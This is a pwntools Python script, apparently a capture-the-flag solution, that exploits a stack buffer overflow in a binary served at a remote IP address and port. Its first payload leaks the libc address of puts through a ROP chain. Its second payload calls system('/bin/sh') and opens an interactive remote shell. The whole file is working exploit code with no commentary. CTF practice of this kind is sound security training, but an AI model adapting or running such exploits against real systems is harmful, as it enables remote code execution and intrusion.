from os import system
from pwn import *
p=remote("1.14.71.254",28504)
elf=ELF('./d')
libc=ELF('./libc-2.23-x64.so')
put_got=elf.got['puts']
put_plt=elf.plt['puts']
rsi_r15=0x0000000000400761

rdi=0x0000000000400763
main=elf.symbols['main']
start_add = elf.symbols['_start']


payload=b'a'*0x18+p64(rdi)+p64(put_got)+p64(put_plt)+p64(main)
p.sendline(payload)
#put_addr=u64(p.recv(6).ljust(8,b'\x00'))
put_addr=u64(p.recvuntil(b'\x7f').ljust(8,b'\x00'))
print(hex(put_addr))
#pause
offset=put_addr-libc.symbols["puts"]
#binsh=libc.search(b"/bin/sh").__next__()+offset
system_addr=libc.symbols["system"]+offset

#offset=put_addr-0x06f6a0
binsh=offset+0x18ce57
#system_addr=offset+0x0453a0
payload2=b'a'*0x18+p64(rdi)+p64(binsh)+p64(system_addr)
p.sendline(payload2)
p.interactive()